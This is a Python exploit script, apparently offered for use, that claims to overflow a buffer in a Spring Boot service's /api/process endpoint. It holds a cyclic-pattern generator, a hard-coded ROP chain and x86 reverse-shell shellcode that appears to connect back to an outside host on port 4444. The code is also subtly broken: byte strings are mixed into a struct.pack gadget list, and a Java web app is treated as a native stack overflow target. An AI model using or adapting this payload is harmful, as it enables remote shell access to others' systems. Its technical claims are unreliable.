#!/usr/bin/env python3
import socket
import struct
import sys
import requests
import time
from typing import List, Tuple

banner = r"""

                    .__              ___.   _______  _______   __   
  ___________________|__| ____    ____\_ |__ \   _  \ \   _  \_/  |_ 
 /  ___/\____ \_  __ \  |/    \  / ___\| __ \/  /_\  \/  /_\  \   __\
 \___ \ |  |_> >  | \/  |   |  \/ /_/  > \_\ \  \_/   \  \_/   \  |  
/____  >|   __/|__|  |__|___|  /\___  /|___  /\_____  /\_____  /__|  
     \/ |__|                 \//_____/     \/       \/       \/   

"""

class SpringBootBufferOverflow:
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.offset = 2048  # Adjusted based on target analysis

        # Common bad characters in SpringBoot context
        self.badchars = (
            b"\x00\x0a\x0d\x20"  # Null, LF, CR, Space
            b"\x3c\x3e\x3f"      # <, >, ?
            b"\x7b\x7d\x7f"      # {, }, DEL
        )

        # x86/linux/shell_reverse_tcp - configurable port
        self.shellcode = (
            b"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53"
            b"\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b"
            b"\x68\x0a\x00\x00\x01\x68\x02\x00\x11\x5c"
            b"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1"
            b"\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d"
            b"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )

    def generate_pattern(self, length: int) -> bytes:
        """Generate cyclic pattern for offset detection"""
        pattern = b""
        parts = []
        for x in range(65, 91):  # A-Z
            for y in range(97, 123):  # a-z
                for z in range(48, 58):  # 0-9
                    parts.append(bytes([x, y, z]))

        while len(pattern) < length:
            pattern += parts[len(pattern) // 3]
        return pattern[:length]

    def find_offset(self, pattern: bytes, eip_value: int) -> int:
        """Find EIP offset in pattern"""
        eip = struct.pack("<I", eip_value)
        return pattern.find(eip)

    def build_rop_chain(self) -> bytes:
        """Build ROP chain to bypass DEP"""
        rop_gadgets = [
            0x0806ed0a,  # pop edx ; ret
            0x08072000,  # @ .data
            0x080b81c6,  # pop eax ; ret
            b'/bin',
            0x080547db,  # mov dword ptr [edx], eax ; ret
            0x0806ed0a,  # pop edx ; ret
            0x08072004,  # @ .data + 4
            0x080b81c6,  # pop eax ; ret
            b'//sh',
            0x080547db,  # mov dword ptr [edx], eax ; ret
            0x0806ed0a,  # pop edx ; ret
            0x08072008,  # @ .data + 8
            0x08049022,  # xor eax, eax ; ret
            0x080547db,  # mov dword ptr [edx], eax ; ret
            0x080481c9,  # pop ebx ; ret
            0x08072000,  # @ .data
            0x080de955,  # pop ecx ; ret
            0x08072008,  # @ .data + 8
            0x0806ed0a,  # pop edx ; ret
            0x08072008,  # @ .data + 8
            0x08049022,  # xor eax, eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x0807b75f,  # inc eax ; ret
            0x08049781,  # int 0x80
        ]

        return b''.join(struct.pack('<I', gadget) for gadget in rop_gadgets)

    def build_payload(self, offset: int) -> bytes:
        """Build the complete payload"""
        # NOP sled
        nop_sled = b"\x90" * 32

        # Build payload
        payload = b"A" * offset
        payload += struct.pack("<I", 0x08048f02)  # JMP ESP
        payload += b"\x90" * 16  # Small NOP sled
        payload += self.build_rop_chain()
        payload += nop_sled
        payload += self.shellcode
        payload += b"C" * (4096 - len(payload))  # Padding

        return payload

    def send_exploit(self, payload: bytes) -> bool:
        """Send exploit payload to target"""
        try:
            print("[*] Sending exploit payload...")

            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Connection': 'keep-alive',
                'Content-Length': str(len(payload))
            }

            # Construct exploit URL
            url = f"http://{self.target}:{self.port}/api/process"

            # Send payload
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=5
            )

            if response.status_code in [500, 502, 504]:
                print("[+] Target possibly crashed - buffer overflow successful")
                return True

            print(f"[-] Unexpected response: {response.status_code}")
            return False

        except requests.exceptions.RequestException as e:
            print(f"[!] Error sending exploit: {str(e)}")
            return False

    def verify_vulnerability(self) -> bool:
        """Verify if target is vulnerable"""
        try:
            # Send test pattern
            pattern = self.generate_pattern(4096)

            print("[*] Testing for vulnerability...")
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Connection': 'close'
            }

            url = f"http://{self.target}:{self.port}/api/process"
            response = requests.post(url, data=pattern, headers=headers)

            return response.status_code in [500, 502, 504]

        except requests.exceptions.RequestException:
            return False

    def exploit(self) -> bool:
        """Main exploit method"""
        print(f"[*] Targeting {self.target}:{self.port}")

        if not self.verify_vulnerability():
            print("[-] Target does not appear to be vulnerable")
            return False

        print("[+] Target appears vulnerable!")

        # Generate and send payload
        payload = self.build_payload(self.offset)
        if self.send_exploit(payload):
            print("[+] Exploit sent successfully")
            return True

        return False

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target> <port>")
        print("Example: python3 springboot_overflow.py 192.168.1.10 8080")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])

    exploit = SpringBootBufferOverflow(target, port)
    exploit.exploit()

if __name__ == "__main__":
    print(banner)
    main()